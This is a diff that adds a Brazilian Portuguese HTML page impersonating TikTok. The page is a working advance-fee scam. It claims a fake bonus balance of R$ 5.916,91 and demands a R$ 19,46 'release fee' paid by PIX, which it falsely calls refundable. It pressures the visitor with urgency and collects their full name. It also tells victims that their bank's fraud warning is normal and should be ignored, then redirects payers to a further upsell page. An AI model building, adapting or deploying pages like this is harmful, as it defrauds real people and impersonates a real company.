@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Premium - Bônus Oculto</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
+        
+        body { 
+            font-family: 'Figtree', sans-serif; 
+            background-color: #000; 
+            color: white; 
+            margin: 0; 
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .animated-gradient {
+            background: linear-gradient(to right, #FE2C55 0%, #25F4EE 25%, #ffffff 50%, #25F4EE 75%, #FE2C55 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: flowing 2s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes flowing {
+            to { background-position: 200% center; }
+        }
+
+        .card-error-highlight {
+            background: linear-gradient(135deg, rgba(254, 44, 85, 0.15) 0%, rgba(37, 244, 238, 0.15) 100%);
+            border: 2px solid #FE2C55;
+            box-shadow: 0 0 25px rgba(254, 44, 85, 0.4);
+            backdrop-filter: blur(15px);
+        }
+
+        .pulse-glow {
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 15px rgba(254, 44, 85, 0.3); }
+            50% { box-shadow: 0 0 35px rgba(37, 244, 238, 0.5); }
+        }
+
+        .btn-tiktok {
+            background-color: #FE2C55;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-tiktok:active { transform: scale(0.96); filter: brightness(0.9); }
+        
+        .logo-main {
+            filter: drop-shadow(0 0 15px rgba(255,255,255,0.3));
+        }
+
+        /* Spinner */
+        .co-spinner {
+            width: 18px; height: 18px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: co-spin 0.8s linear infinite;
+            display: inline-block;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @keyframes co-spin { to { transform: rotate(360deg); } }
+
+        /* STEP 2 QR */
+        .co-qr-box {
+            background: #111;
+            border-radius: 0;
+            width: 155px; height: 155px;
+            margin: 0 auto 12px;
+            display: flex; align-items: center; justify-content: center;
+            padding: 10px; box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .co-qr-img { width: 100%; height: 100%; object-fit: contain; border-radius: 0; }
+
+        .co-success-toast {
+            position: fixed; top: 16px; left: 16px; right: 16px;
+            background: #ecfdf5; border: 1px solid #10b981; color: #065f46;
+            padding: 12px 18px; border-radius: 12px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; gap: 8px;
+            box-shadow: 0 8px 24px rgba(16,185,129,0.15); z-index: 9999;
+            animation: slideDown 0.4s cubic-bezier(0.16,1,0.3,1) forwards;
+        }
+        .co-success-toast.fade-out { animation: slideUp 0.4s ease forwards; }
+        @keyframes slideDown { from { opacity:0; transform:translateY(-30px); } to { opacity:1; transform:translateY(0); } }
+        @keyframes slideUp { from { opacity:1; transform:translateY(0); } to { opacity:0; transform:translateY(-30px); } }
+
+        .co-error-box {
+            background: #fef2f2; border: 1px solid #fca5a5; color: #991b1b;
+            border-radius: 10px; padding: 12px 14px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; gap: 8px; margin-bottom: 10px;
+        }
+
+        .pix-code-truncated {
+            font-size: 11px; color: #94a3b8; text-align: center;
+            text-overflow: ellipsis; overflow: hidden; white-space: nowrap; width: 100%;
+            margin: 4px 0 8px;
+        }
+
+        .co-btn-copiar {
+            width: 100%; height: 52px;
+            background: #FE2C55;
+            border: none; border-radius: 14px; color: #fff;
+            font-size: 15px; font-weight: 800;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; margin-bottom: 8px;
+            box-shadow: 0 4px 14px rgba(254,44,85,0.2);
+            transition: transform 0.1s;
+        }
+        .co-btn-copiar:active { transform: scale(0.98); }
+
+        .co-btn-ja-efetuei {
+            width: 100%; height: 46px;
+            background: #111; border: 1px solid rgba(255, 255, 255, 0.1); color: #fff;
+            border-radius: 12px; font-size: 13px; font-weight: 600;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; margin-bottom: 8px;
+        }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <div class="w-full py-0 flex justify-center border-b border-white/5 bg-black/95 sticky top-0 z-50">
+        <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" class="h-28 filter brightness-0 invert logo-main" alt="TikTok">
+    </div>
+
+    <!-- PÁGINA UPSELL -->
+    <div id="page-upsell" class="max-w-md mx-auto px-6 pt-10 pb-20 text-center">
+        
+        <h2 class="text-[#25F4EE] text-[12px] font-black uppercase tracking-[0.4em] mb-4">Notificação do Sistema</h2>
+        <h1 class="text-5xl font-black mb-10 leading-none tracking-tighter italic">
+            BÔNUS <span class="animated-gradient">EXTRA</span>
+        </h1>
+
+        <div class="card-error-highlight rounded-[2.5rem] p-8 mb-10 text-center relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-right from-[#FE2C55] to-[#25F4EE]"></div>
+            
+            <p class="text-[#FE2C55] text-xs font-black uppercase tracking-widest mb-4">⚠️ Ação Urgente Necessária</p>
+            
+            <h3 class="text-2xl font-black text-white leading-tight mb-4">
+                Devido ao erro no processamento do seu saque anterior...
+            </h3>
+            
+            <p class="text-gray-200 text-lg leading-relaxed italic">
+                O sistema desbloqueou uma <span class="text-[#25F4EE] font-black">compensação de bônus automática</span> para a sua conta.
+            </p>
+            
+            <div class="mt-6 pt-6 border-t border-white/10">
+                <p class="text-gray-400 text-sm">
+                    O saldo anterior de <span class="text-white font-bold">R$ 5.320,18</span> foi atualizado com o novo bônus de <span class="text-[#FE2C55] font-bold">R$ 596,73</span>.
+                </p>
+            </div>
+        </div>
+
+        <div class="relative mb-10">
+            <div class="relative bg-white rounded-[2.5rem] py-12 text-black shadow-2xl pulse-glow">
+                <p class="text-[11px] font-extrabold uppercase tracking-[0.2em] text-gray-400 mb-2">Novo Saldo Total para Saque</p>
+                
+                <div class="flex justify-center items-center">
+                    <span class="text-6xl font-[1000] tracking-tighter text-black">
+                        R$ 5.916,91
+                    </span>
+                </div>
+
+                <div class="flex justify-center items-center gap-2 mt-5">
+                    <span class="w-3 h-3 bg-[#FE2C55] rounded-full animate-pulse"></span>
+                    <span class="text-[11px] font-black text-[#FE2C55] uppercase tracking-widest">Liberado para Pix Agora</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white/5 border border-white/10 rounded-3xl p-6 mb-10">
+            <p class="text-gray-300 text-sm mb-2">
+                Taxa Única de Liberação: <span class="text-[#25F4EE] text-2xl font-black">R$ 19,46</span>
+            </p>
+            <p class="text-white/60 font-bold text-[10px] uppercase tracking-widest leading-tight">
+                *O valor da taxa é reembolsado no saldo total do saque
+            </p>
+        </div>
+
+        <button onclick="abrirCheckout()" class="block w-full btn-tiktok text-white text-center py-7 rounded-full font-black text-2xl uppercase tracking-tighter shadow-[0_10px_40px_rgba(254,44,85,0.5)]">
+            RESGATAR MEU BÔNUS
+        </button>
+
+        <div class="mt-8 px-4">
+            <p class="text-gray-400 text-[13px] leading-relaxed italic">
+                <span class="text-[#FE2C55] font-bold">Aviso:</span> Caso opte por não resgatar esse bônus agora, seu saldo retornará ao valor padrão do sistema. 
+                <span class="text-white font-bold">Recomendamos fortemente o resgate imediato</span>, pois os ganhos financeiros desta compensação são superiores ao saque comum.
+            </p>
+        </div>
+
+        <div class="mt-16 pt-8 border-t border-white/5 opacity-40">
+            <p class="text-[9px] font-bold uppercase tracking-[0.4em]">Protocolo de Segurança: TK-5156-2026</p>
+            <p class="text-[9px] font-bold uppercase tracking-[0.4em] mt-1">TikTok Business Compliance</p>
+        </div>
+
+    </div>
+
+    <!-- CHECKOUT OVERLAY -->
+    <div id="page-checkout" class="hidden fixed inset-0 z-[9999] bg-[#121212] overflow-y-auto">
+        <!-- Barra topo -->
+        <div class="bg-[#FE2C55] text-white text-center py-3 px-4 text-[12px] font-bold uppercase tracking-tight w-full sticky top-0 z-50">
+            PAGAMENTO 100% SEGURO
+        </div>
+
+        <div class="max-w-md mx-auto pb-16 px-4 pt-6">
+
+            <!-- Etapa 1: Identificação -->
+            <div id="co-step-1">
+
+                <!-- Card produto -->
+                <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800 mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-12 h-12 rounded-xl border border-zinc-800 flex items-center justify-center overflow-hidden flex-shrink-0 bg-zinc-950">
+                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                        </div>
+                        <div>
+                            <div class="text-[15px] font-bold text-white">Compensação de Bônus Oculto</div>
+                        </div>
+                    </div>
+                    <div class="border-t border-zinc-800 mt-4 pt-3 flex justify-between items-center">
+                        <span class="text-sm text-zinc-400 font-medium">Total</span>
+                        <span class="text-sm font-semibold text-white">R$ 19,46</span>
+                    </div>
+                </div>
+
+                <!-- Card identificação -->
+                <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800 mb-4">
+                    <div class="flex items-center gap-2 mb-4">
+                        <div class="w-6 h-6 bg-[#FE2C55] rounded-full flex items-center justify-center flex-shrink-0">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="white" stroke-width="2" viewBox="0 0 24 24">
+                                <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/>
+                            </svg>
+                        </div>
+                        <h2 class="text-[16px] font-bold text-white">Identificação</h2>
+                    </div>
+                    <label class="block text-sm font-semibold text-zinc-400 mb-2">Nome completo</label>
+                    <input type="text" id="checkout-name" placeholder="Nome e sobrenome"
+                           class="w-full border border-zinc-800 bg-zinc-950 text-white rounded-xl px-4 py-3 text-sm outline-none focus:border-[#FE2C55] transition-colors">
+                </div>
+
+                <div id="co-error" class="hidden co-error-box">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="#dc2626" stroke-width="2.5" viewBox="0 0 24 24" style="flex-shrink:0"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                    <span id="co-error-text"></span>
+                </div>
+
+                <button id="btn-pagar-agora" onclick="gerarPix()" class="btn-tiktok w-full text-white font-[900] py-4 rounded-2xl text-[15px] uppercase tracking-wider mb-3 flex items-center justify-center gap-2">
+                    PAGAR AGORA
+                </button>
+                <p class="text-center text-[11px] text-zinc-400 flex items-center justify-center gap-1">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#10b981" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                    Pagamento seguro via PIX com aprovação imediata.
+                </p>
+            </div>
+
+            <!-- Etapa 2: QR Code -->
+            <div id="co-step-2" class="hidden">
+
+                <!-- Card produto -->
+                <div class="bg-zinc-900 rounded-2xl p-5 border border-zinc-800 mb-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-12 h-12 rounded-xl border border-zinc-800 flex items-center justify-center overflow-hidden flex-shrink-0 bg-zinc-950">
+                            <img src="https://images.seeklogo.com/logo-png/37/2/tiktok-app-logo-png_seeklogo-375617.png" alt="TikTok" class="w-full h-full object-cover">
+                        </div>
+                        <div>
+                            <div class="text-[15px] font-bold text-white">Compensação de Bônus Oculto</div>
+                        </div>
+                    </div>
+                    <div class="border-t border-zinc-800 mt-4 pt-3 flex justify-between items-center">
+                        <span class="text-sm text-zinc-400 font-medium">Total</span>
+                        <span class="text-sm font-semibold text-white">R$ 19,46</span>
+                    </div>
+                </div>
+
+                <h2 class="text-[18px] font-bold text-center text-white mb-4">Escaneie o QR-code ou copie o código.</h2>
+
+                <!-- QR Code -->
+                <div class="co-qr-box">
+                    <img id="qr-img" src="" alt="QR Code PIX" class="co-qr-img">
+                </div>
+
+                <!-- Valor e código truncado -->
+                <div class="flex justify-between items-center px-1 mb-1">
+                    <span class="text-sm text-zinc-400 font-medium">Valor PIX:</span>
+                    <span class="text-[22px] font-black text-white">R$ 19,46</span>
+                </div>
+                <div class="pix-code-truncated" id="pix-code-truncated"></div>
+
+                <!-- Botões -->
+                <button onclick="copiarPix()" class="co-btn-copiar">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="white" stroke-width="2.5" viewBox="0 0 24 24" style="margin-right:6px"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    Copiar PIX
+                </button>
+
+                <button id="btn-ja-efetuei" onclick="verificarPagamento()" class="co-btn-ja-efetuei">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px"><polyline points="23 4 23 10 17 10"/><polyline points="1 20 1 14 7 14"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+                    Já efetuei o pagamento!
+                </button>
+
+                <!-- Aviso redirecionamento -->
+                <div class="flex items-start text-[11px] text-zinc-400 leading-relaxed mb-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="none" stroke="#6b7280" stroke-width="2" viewBox="0 0 24 24" style="margin-right:6px;flex-shrink:0;margin-top:2px"><polyline points="9 18 15 12 9 6"/></svg>
+                    <span>Você será redirecionado automaticamente após a confirmação do pagamento. Se preferir, clique em <strong>"Já efetuei o pagamento!"</strong> para verificar se o pagamento foi aprovado.</span>
+                </div>
+
+                <!-- Aviso banco -->
+                <div class="bg-blue-950 border border-blue-900 rounded-xl p-3 mb-4">
+                    <div class="flex items-center gap-2 text-blue-300 font-bold text-[12px] mb-1">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="none" stroke="#93c5fd" stroke-width="2" viewBox="0 0 24 24" style="flex-shrink:0"><path d="M12 2s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
+                        <strong>Seu banco pode exibir um alerta</strong>
+                    </div>
+                    <p class="text-blue-200 text-[11px] leading-relaxed">Alguns bancos mostram um aviso automático em qualquer Pix para um destinatário novo. Isso é normal e não significa que a compra é golpe. Confira os dados e conclua o pagamento com tranquilidade.</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <input type="text" id="pix-copy-input" style="position:absolute;left:-9999px;" readonly>
+
+    <script>
+        let _pixTxid = null;
+        let _pixRoute = null;
+        let _pollingInterval = null;
+
+        function abrirCheckout() {
+            document.getElementById('page-checkout').classList.remove('hidden');
+            window.scrollTo(0, 0);
+        }
+
+        function mostrarErro(msg) {
+            const el = document.getElementById('co-error');
+            document.getElementById('co-error-text').textContent = msg;
+            el.classList.remove('hidden');
+        }
+
+        function ocultarErro() {
+            document.getElementById('co-error').classList.add('hidden');
+        }
+
+        function mostrarToast(msg, verde = true) {
+            const t = document.createElement('div');
+            t.className = 'co-success-toast';
+            t.style.background = verde ? '#ecfdf5' : '#fef2f2';
+            t.style.borderColor = verde ? '#10b981' : '#fca5a5';
+            t.style.color = verde ? '#065f46' : '#991b1b';
+            t.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" stroke="${verde ? '#10b981' : '#dc2626'}" stroke-width="3" viewBox="0 0 24 24" style="flex-shrink:0"><polyline points="20 6 9 17 4 12"/></svg> ${msg}`;
+            document.body.appendChild(t);
+            setTimeout(() => { t.classList.add('fade-out'); setTimeout(() => t.remove(), 400); }, 3000);
+        }
+
+        function pararPolling() {
+            if (_pollingInterval) { clearInterval(_pollingInterval); _pollingInterval = null; }
+        }
+
+        function aoAprovar() {
+            pararPolling();
+            mostrarToast('Pagamento confirmado! Redirecionando...');
+            setTimeout(() => { window.location.href = 'up8.html'; }, 1500);
+        }
+
+        function iniciarPolling(txid, route) {
+            pararPolling();
+            let tentativas = 0;
+            _pollingInterval = setInterval(async () => {
+                tentativas++;
+                if (tentativas > 60) { pararPolling(); return; }
+                try {
+                    const resp = await fetch('/api/pix/status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ txid, route })
+                    });
+                    const data = await resp.json();
+                    if (data.status === 'approved') { aoAprovar(); }
+                } catch (e) {}
+            }, 6000);
+        }
+
+        async function gerarPix() {
+            const nome = document.getElementById('checkout-name').value.trim();
+            const palavras = nome.split(/\s+/).filter(p => p.length >= 2);
+            if (palavras.length < 2) {
+                const input = document.getElementById('checkout-name');
+                input.style.borderColor = '#FE2C55';
+                input.placeholder = nome === '' ? 'Digite seu nome e sobrenome' : 'Precisa incluir o sobrenome também';
+                input.value = '';
+                setTimeout(() => { input.style.borderColor = ''; }, 2000);
+                return;
+            }
+
+            ocultarErro();
+            const btn = document.getElementById('btn-pagar-agora');
+            btn.innerHTML = 'Gerando PIX... <span class="co-spinner"></span>';
+            btn.disabled = true;
+            btn.style.opacity = '0.8';
+
+            try {
+                const resp = await fetch('/api/pix/gerar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ nome, amount: 1946 }) // R$ 19,46 em centavos
+                });
+                const data = await resp.json();
+
+                btn.innerHTML = 'PAGAR AGORA';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+
+                if (!resp.ok || data.error) {
+                    mostrarErro(data.error || 'Erro ao gerar PIX. Tente novamente.');
+                    return;
+                }
+
+                _pixTxid = data.txid;
+                _pixRoute = data.route;
+
+                const qrImg = document.getElementById('qr-img');
+                if (data.pix_qr_code) {
+                    qrImg.src = data.pix_qr_code;
+                } else if (data.pix_code) {
+                    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.pix_code)}`;
+                }
+
+                document.getElementById('pix-copy-input').value = data.pix_code;
+                const trunc = document.getElementById('pix-code-truncated');
+                if (trunc) trunc.textContent = data.pix_code.substring(0, 95) + '...';
+
+                document.getElementById('co-step-1').classList.add('hidden');
+                document.getElementById('co-step-2').classList.remove('hidden');
+                window.scrollTo(0, 0);
+
+                mostrarToast('Código PIX gerado com sucesso!');
+                iniciarPolling(data.txid, data.route);
+
+            } catch (err) {
+                btn.innerHTML = 'PAGAR AGORA';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                mostrarErro('Erro de conexão. Verifique sua internet e tente novamente.');
+            }
+        }
+
+        function copiarPix() {
+            const input = document.getElementById('pix-copy-input');
+            input.select();
+            input.setSelectionRange(0, 99999);
+            navigator.clipboard.writeText(input.value).then(() => {
+                mostrarToast('Código PIX copiado!');
+            }).catch(() => {
+                document.execCommand('copy');
+                mostrarToast('Código PIX copiado!');
+            });
+        }
+
+        async function verificarPagamento() {
+            if (!_pixTxid) return;
+            const btn = document.getElementById('btn-ja-efetuei');
+            btn.textContent = 'Verificando...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/api/pix/status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ txid: _pixTxid, route: _pixRoute })
+                });
+                const data = await resp.json();
+                if (data.status === 'approved') { aoAprovar(); }
+                else {
+                    btn.innerHTML = 'Já efetuei o pagamento!';
+                    btn.disabled = false;
+                    mostrarToast('Pagamento ainda não identificado. Aguarde ou tente novamente.', false);
+                }
+            } catch (e) {
+                btn.innerHTML = 'Já efetuei o pagamento!';
+                btn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
